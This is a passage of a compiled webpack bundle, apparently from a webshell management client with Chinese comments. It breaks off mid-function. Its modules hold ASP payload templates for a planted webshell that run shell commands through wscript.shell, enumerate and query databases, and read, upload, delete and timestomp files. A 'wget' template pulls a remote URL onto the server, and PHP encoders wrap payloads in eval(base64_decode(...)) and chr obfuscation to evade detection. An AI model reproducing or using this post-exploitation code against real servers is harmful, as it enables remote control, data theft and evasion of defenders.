	exports.write = function (buffer, value, offset, isLE, mLen, nBytes) {
	  var e, m, c
	  var eLen = nBytes * 8 - mLen - 1
	  var eMax = (1 << eLen) - 1
	  var eBias = eMax >> 1
	  var rt = (mLen === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0)
	  var i = isLE ? 0 : (nBytes - 1)
	  var d = isLE ? 1 : -1
	  var s = value < 0 || (value === 0 && 1 / value < 0) ? 1 : 0

	  value = Math.abs(value)

	  if (isNaN(value) || value === Infinity) {
	    m = isNaN(value) ? 1 : 0
	    e = eMax
	  } else {
	    e = Math.floor(Math.log(value) / Math.LN2)
	    if (value * (c = Math.pow(2, -e)) < 1) {
	      e--
	      c *= 2
	    }
	    if (e + eBias >= 1) {
	      value += rt / c
	    } else {
	      value += rt * Math.pow(2, 1 - eBias)
	    }
	    if (value * c >= 2) {
	      e++
	      c /= 2
	    }

	    if (e + eBias >= eMax) {
	      m = 0
	      e = eMax
	    } else if (e + eBias >= 1) {
	      m = (value * c - 1) * Math.pow(2, mLen)
	      e = e + eBias
	    } else {
	      m = value * Math.pow(2, eBias - 1) * Math.pow(2, mLen)
	      e = 0
	    }
	  }

	  for (; mLen >= 8; buffer[offset + i] = m & 0xff, i += d, m /= 256, mLen -= 8) {}

	  e = (e << mLen) | m
	  eLen += mLen
	  for (; eLen > 0; buffer[offset + i] = e & 0xff, i += d, e /= 256, eLen -= 8) {}

	  buffer[offset + i - d] |= s * 128
	}


/***/ },
/* 8 */
/***/ function(module, exports) {

	var toString = {}.toString;

	module.exports = Array.isArray || function (arr) {
	  return toString.call(arr) == '[object Array]';
	};


/***/ },
/* 9 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./argv": 10,
		"./argv.jsx": 10,
		"./base": 11,
		"./base.jsx": 11,
		"./command": 12,
		"./command.jsx": 12,
		"./database/access": 13,
		"./database/access.jsx": 13,
		"./database/default": 14,
		"./database/default.jsx": 14,
		"./database/dsn": 15,
		"./database/dsn.jsx": 15,
		"./database/microsoft_jet_oledb_4_0": 16,
		"./database/microsoft_jet_oledb_4_0.jsx": 16,
		"./database/mysql": 17,
		"./database/mysql.jsx": 17,
		"./database/oracle": 18,
		"./database/oracle.jsx": 18,
		"./database/sqloledb_1": 19,
		"./database/sqloledb_1.jsx": 19,
		"./database/sqloledb_1_sspi": 20,
		"./database/sqloledb_1_sspi.jsx": 20,
		"./database/sqlserver": 21,
		"./database/sqlserver.jsx": 21,
		"./filemanager": 22,
		"./filemanager.jsx": 22
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 9;


/***/ },
/* 10 */
/***/ function(module, exports) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	/**
	 * 在模板中使用
	 * 1. 加载需要的参数列表： import { arg1, arg2, arg3 } from './argv';
	 * 2. 嵌入代码参数中：codes={[arg1]: `echo "${arg1}";`}...
	 **/

	var random = function random() {
	  return "0x" + (Math.random() + Math.random()).toString(16).substr(2);
	};

	var arg1 = exports.arg1 = random();
	var arg2 = exports.arg2 = random();
	var arg3 = exports.arg3 = random();
	var arg4 = exports.arg4 = random();
	var arg5 = exports.arg5 = random();
	var arg6 = exports.arg6 = random();

/***/ },
/* 11 */
/***/ function(module, exports) {

	"use strict";

	//
	// 基础信息模板
	// 获取：当前路径、磁盘列表
	//

	module.exports = {
	  info: "Dim S:SET C=CreateObject(\"Scripting.FileSystemObject\"):If Err Then:S=\"ERROR:// \"&Err.Description:Err.Clear:Else:S=Server.Mappath(\".\")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(S)"
	};

/***/ },
/* 12 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _exec;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 命令执行模板
	//

	module.exports = {
	  exec: (_exec = {
	    _: "Set X=CreateObject(\"wscript.shell\").exec(\"\"\"\"&bd(Request(\"" + _argv.arg1 + "\"))&\"\"\" /c \"\"\"&bd(Request(\"" + _argv.arg2 + "\"))&\"\"\"\"):If Err Then:S=\"[Err] \"&Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&E:End If:Response.write(S)"
	  }, _defineProperty(_exec, _argv.arg1, "#{hex::bin}"), _defineProperty(_exec, _argv.arg2, "#{hex::cmd}"), _exec)
	};

/***/ },
/* 13 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_columns, _query;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASP::access数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("' + _argv.arg1 + '")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI=Request("' + _argv.arg2 + '")&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_databases, _argv.arg2, '#{dbname}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.OpenSchema(20):Rs.MoveFirst:SI="":Do While Not Rs.Eof:If Rs("TABLE_TYPE")="TABLE" Then:SI=SI&Rs("TABLE_NAME")&chr(9):End If:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open ""&bd(Request("' + _argv.arg2 + '"))&"",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&" ("&TN(Rs.Fields.Item(n).Type)&")"&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{hex::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":Dim CO,HD,RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD="Result"&CO&RN:If Err Then:Response.Write HD&Err.Description&CO&RN:Err.Clear:Else:Set Rs=Conn.Execute(""&bd(Request("' + _argv.arg2 + '"))&""):If Err Then:Response.Write HD&Err.Number&":"&Err.Description&CO&RN:Err.Clear:Else:Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Response.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:'
	  }, _defineProperty(_query, _argv.arg1, '#{hex::conn}'), _defineProperty(_query, _argv.arg2, '#{hex::sql}'), _query)
	};

/***/ },
/* 14 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_columns, _query;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 默认数据库操作代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("' + _argv.arg1 + '")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="[ADO DATABASE]"&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.OpenSchema(20):Rs.MoveFirst:SI="":Do While Not Rs.Eof:If Rs("TABLE_TYPE")="TABLE" Then:SI=SI&Rs("TABLE_NAME")&chr(9):End If:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open ""&bd(Request("' + _argv.arg2 + '"))&"",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&" ("&TN(Rs.Fields.Item(n).Type)&")"&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{hex::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":Dim CO,HD,RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD="Result"&CO&RN:If Err Then:Response.Write HD&Err.Description&CO&RN:Err.Clear:Else:Set Rs=Conn.Execute(""&bd(Request("' + _argv.arg2 + '"))&""):If Err Then:Response.Write HD&Err.Number&":"&Err.Description&CO&RN:Err.Clear:Else:Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Response.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:'
	  }, _defineProperty(_query, _argv.arg1, '#{hex::conn}'), _defineProperty(_query, _argv.arg2, '#{hex::sql}'), _query)
	};

/***/ },
/* 15 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASP::DNS数据库驱动代码模板
	//

	module.exports = __webpack_require__(14);

/***/ },
/* 16 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASP::microsoft_jet_oledb_4_0数据库驱动代码模板
	//

	module.exports = __webpack_require__(13);

/***/ },
/* 17 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASP::mysql数据库驱动代码模板
	//

	module.exports = __webpack_require__(14);

/***/ },
/* 18 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_columns, _query;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASP::oracle数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("' + _argv.arg1 + '")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="[ADO DATABASE]"&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.Execute("SELECT TABLE_NAME FROM ALL_TABLES"):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open ""&bd(Request("' + _argv.arg2 + '"))&"",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&" ("&TN(Rs.Fields.Item(n).Type)&")"&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{hex::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":Dim CO,HD,RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD="Result"&CO&RN:If Err Then:Response.Write HD&Err.Description&CO&RN:Err.Clear:Else:Set Rs=Conn.Execute(""&bd(Request("' + _argv.arg2 + '"))&""):If Err Then:Response.Write HD&Err.Number&":"&Err.Description&CO&RN:Err.Clear:Else:Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Response.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:'
	  }, _defineProperty(_query, _argv.arg1, '#{hex::conn}'), _defineProperty(_query, _argv.arg2, '#{hex::sql}'), _query)
	};

/***/ },
/* 19 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASP::sqloledb_1数据库驱动代码模板
	//

	module.exports = __webpack_require__(14);

/***/ },
/* 20 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASP::sqloledb_1_sspi数据库驱动代码模板
	//

	module.exports = __webpack_require__(14);

/***/ },
/* 21 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASP::mysql数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("z1")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open "select [name] from master.dbo.sysdatabases order by 1",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _argv.arg1, '#{hex::conn}'),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("z1"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.Execute("USE ["&Request("z2")&"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1"):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Do While Not(Rs.Eof Or Rs.Bof):SI=SI&Rs(0)&chr(9):Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_tables, _argv.arg2, '#{dbname}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open ""&bd(Request("' + _argv.arg2 + '"))&"",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&" ("&TN(Rs.Fields.Item(n).Type)&")"&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{hex::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{hex::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open ""&bd(Request("' + _argv.arg1 + '"))&"":Dim CO,HD,RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD="Result"&CO&RN:If Err Then:Response.Write HD&Err.Description&CO&RN:Err.Clear:Else:Set Rs=Conn.Execute(""&bd(Request("' + _argv.arg2 + '"))&""):If Err Then:Response.Write HD&Err.Number&":"&Err.Description&CO&RN:Err.Clear:Else:Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Response.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:'
	  }, _defineProperty(_query, _argv.arg1, '#{hex::conn}'), _defineProperty(_query, _argv.arg2, '#{hex::sql}'), _query)
	};

/***/ },
/* 22 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _create_file, _copy, _upload_file, _rename, _retime, _wget;

	var _argv = __webpack_require__(10);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 文件管理模板
	//

	module.exports = {
	  dir: _defineProperty({
	    _: "Dim RR:RR=bd(Request(\"" + _argv.arg1 + "\")):Function FD(dt):FD=Year(dt)&\"-\":If Len(Month(dt))=1 Then:FD = FD&\"0\":End If:FD=FD&Month(dt)&\"-\":If Len(Day(dt))=1 Then:FD=FD&\"0\":End If:FD=FD&Day(dt)&\" \"&FormatDateTime(dt,4)&\":\":If Len(Second(dt))=1 Then:FD=FD&\"0\":End If:FD=FD&Second(dt):End Function:SET C=CreateObject(\"Scripting.FileSystemObject\"):Set FO=C.GetFolder(\"\"&RR&\"\"):If Err Then:Response.Write(\"ERROR:// \"&Err.Description):Err.Clear:Else:For Each F in FO.subfolders:Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10):Next:For Each L in FO.files:Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10):Next:End If"
	  }, _argv.arg1, "#{hex::path}"),

	  delete: _defineProperty({
	    _: "Dim P:P=bd(Request(\"" + _argv.arg1 + "\")):Set FS=CreateObject(\"Scripting.FileSystemObject\"):If FS.FolderExists(P)=true Then:FS.DeleteFolder(P):Else:FS.DeleteFile(P):End If:Set FS=Nothing:If Err Then:S=\"ERROR:// \"&Err.Description:Else:S=\"1\":Response.Write(S):End If"
	  }, _argv.arg1, "#{hex::path}"),

	  create_file: (_create_file = {
	    _: "CreateObject(\"Scripting.FileSystemObject\").CreateTextFile(\"\"&bd(Request(\"" + _argv.arg1 + "\"))&\"\").Write(\"\"&bd(Request(\"" + _argv.arg2 + "\"))&\"\"):If Err Then:S=\"ERROR:// \"&Err.Description:Else:S=\"1\":Response.Write(S):End If"
	  }, _defineProperty(_create_file, _argv.arg1, "#{hex::path}"), _defineProperty(_create_file, _argv.arg2, "#{hex::content}"), _create_file),

	  read_file: _defineProperty({
	    _: "Response.Write(CreateObject(\"Scripting.FileSystemObject\").OpenTextfile(bd(Request(\"" + _argv.arg1 + "\")),1,False).readall):If Err Then:Response.Write(\"ERROR:// \"&Err.Description):Err.Clear:End If"
	  }, _argv.arg1, "#{hex::path}"),

	  copy: (_copy = {
	    _: "SF=bd(Request(\"" + _argv.arg1 + "\")):DF=bd(Request(\"" + _argv.arg2 + "\")):Set Fs=CreateObject(\"Scripting.FileSystemObject\"):If Fs.FolderExists(SF) Then:Fs.CopyFolder SF,DF:Else:Fs.CopyFile SF,DF:End If:Set Fs=Nothing:If Err Then:SI=\"ERROR:// \"&Err.Description:else:SI=\"1\":End If:Response.Write(SI)"
	  }, _defineProperty(_copy, _argv.arg1, "#{hex::path}"), _defineProperty(_copy, _argv.arg2, "#{hex::target}"), _copy),

	  download_file: _defineProperty({
	    _: "Dim i,c,r:Set S=Server.CreateObject(\"Adodb.Stream\"):If Not Err Then:With S:.Mode=3:.Type=1:.Open:.LoadFromFile(bd(Request(\"" + _argv.arg1 + "\"))):i=0:c=.Size:r=1024:While i<c:Response.BinaryWrite .Read(r):Response.Flush:i=i+r:Wend:.Close:Set S=Nothing:End With:Else:Response.BinaryWrite \"ERROR:// \"&Err.Description:End If"
	  }, _argv.arg1, "#{hex::path}"),

	  upload_file: (_upload_file = {
	    _: "Dim l,ss,ff,T:ff=bd(request(\"" + _argv.arg1 + "\")):ss=Request(\"" + _argv.arg2 + "\"):l=Len(ss):Set S=Server.CreateObject(\"Adodb.Stream\"):With S:.Type=1:.Mode=3:.Open:On Error Resume Next:.LoadFromFile \"\"&ff&\"\":.Position=.Size:If Err Then:Err.Clear:End If:set rs=CreateObject(\"ADODB.Recordset\"):rs.fields.append \"bb\",205,l/2:rs.open:rs.addnew:rs(\"bb\")=ss+chrb(0):rs.update:.Write rs(\"bb\").getchunk(l/2):rs.close:Set rs=Nothing:.Position=0:.SaveToFile \"\"&ff&\"\",2:.Close:End With:Set S=Nothing:If Err Then:T=Err.Description:Err.Clear:Else:T=\"1\":End If:Response.Write(T)"
	  }, _defineProperty(_upload_file, _argv.arg1, "#{hex::path}"), _defineProperty(_upload_file, _argv.arg2, "#{buffer::content}"), _defineProperty(_upload_file, _argv.arg3, "1"), _upload_file),

	  rename: (_rename = {
	    _: "SF=bd(Request(\"" + _argv.arg1 + "\")):DF=bd(Request(\"" + _argv.arg2 + "\")):Set Fs=CreateObject(\"Scripting.FileSystemObject\"):If Fs.FolderExists(SF) Then:Fs.MoveFolder SF,DF:Else:Fs.MoveFile SF,DF:End If:Set Fs=Nothing:If Err Then:SI=\"ERROR:// \"&Err.Description:Else:SI=\"1\":End If:Response.Write(SI)"
	  }, _defineProperty(_rename, _argv.arg1, "#{hex::path}"), _defineProperty(_rename, _argv.arg2, "#{hex::name}"), _rename),

	  retime: (_retime = {
	    _: "FN=bd(Request(\"" + _argv.arg1 + "\")):TM=bd(Request(\"" + _argv.arg2 + "\")):AA=Split(FN,\"\\\"):PT=\"\":For i=LBound(AA) To UBound(AA)-1:PT=PT&AA(i)&\"\\\":Next:NM=AA(UBound(AA)):Server.CreateObject(\"Shell.Application\").NameSpace(PT).ParseName(NM).Modifydate=TM:If Err Then:SI=\"ERROR:// \"&PT&Err.Description:Err.Clear:Else:SI=\"1\":End If:Response.Write(SI)"
	  }, _defineProperty(_retime, _argv.arg1, "#{hex::path}"), _defineProperty(_retime, _argv.arg2, "#{hex::time}"), _retime),

	  mkdir: _defineProperty({
	    _: "Set Fs=CreateObject(\"Scripting.FileSystemObject\"):Fs.CreateFolder(bd(Request(\"" + _argv.arg1 + "\"))):Set Fs=Nothing:If Err Then:S=\"ERROR:// \"&Err.Description:Else:S=\"1\":End If:Response.Write(S)"
	  }, _argv.arg1, "#{hex::path}"),

	  wget: (_wget = {
	    _: "Dim SI:Set x=CreateObject(\"Microsoft.XMLHTTP\"):x.Open \"GET\",\"\"&bd(Request(\"" + _argv.arg1 + "\"))&\"\",0:x.Send():If Err Then:SI=\"ERROR:// \"&Err.Description:Err.Clear:Else:set s=CreateObject(\"ADODB.Stream\"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile \"\"&bd(Request(\"" + _argv.arg2 + "\"))&\"\",2:If Err Then:SI=\"ERROR:// \"&Err.Description:Err.Clear:Else:SI=\"1\":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)"
	  }, _defineProperty(_wget, _argv.arg1, "#{hex::url}"), _defineProperty(_wget, _argv.arg2, "#{hex::path}"), _wget)
	};

/***/ },
/* 23 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./base64": 24,
		"./base64.jsx": 24,
		"./chr": 25,
		"./chr.jsx": 25
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 23;


/***/ },
/* 24 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {//
	// php::base64 编码模块
	//
	'use strict';

	module.exports = function (pwd, data) {
	  var randomID = '_0x' + Math.random().toString(16).substr(2);
	  data[randomID] = new Buffer(data['_']).toString('base64');
	  data[pwd] = 'eval(base64_decode($_POST[' + randomID + ']));';
	  delete data['_'];
	  return data;
	};
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 25 */
/***/ function(module, exports) {

	//
	// encoder::chr
	//
	// chr编码器
	// --------
	// 利用php函数`chr`进行编码处理
	//
	'use strict';

	module.exports = function (pwd, data) {
	  // 编码函数
	  var encode = function encode(php) {
	    var ret = [];
	    var i = 0;
	    while (i < php.length) {
	      ret.push(php[i].charCodeAt());
	      i++;
	    }
